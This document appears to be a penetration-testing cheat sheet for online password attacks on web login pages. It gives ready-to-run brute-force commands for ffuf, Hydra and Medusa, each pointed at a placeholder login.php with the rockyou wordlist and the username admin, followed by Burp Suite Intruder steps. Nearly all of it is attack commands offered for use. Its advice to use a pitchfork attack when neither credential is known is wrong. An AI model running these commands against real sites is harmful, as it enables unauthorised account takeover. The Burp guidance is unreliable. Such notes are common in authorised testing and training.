# Online Login Pages Password Attacks

### 1) ffuf

    ffuf -c -w /usr/share/wordlists/rockyou.txt -u http://domain.local/login.php -X POST -d "login_username=admin&password=FUZZ" -H "Content-Type: application/x-www-form-urlencoded"

### 2) Hydra (Requires enumerating the printed error after a failed login)

    hydra -l admin -P /usr/share/wordlists/rockyou.txt "http-post-form://domain.local/login.php:username=^USER^&password=^PASS^:Login failed"

### 3) Medusa

    medusa -h domain.local -u admin -P /usr/share/wordlists/rockyou.txt -M http -m DIR:/login -m FORM:username=^USER^&password=^PASS^ -m DENY_SIGNAL:"Login failed"

### 4) Burpsuite Intruder

Intercept the request, then send it to Intruder.

Do a Sniper Attack if you know either the username or password, choose the password field, load the wordlist of your choice and start attacking.

If you do not know either of the username and password, do a pitchfork attack instead.
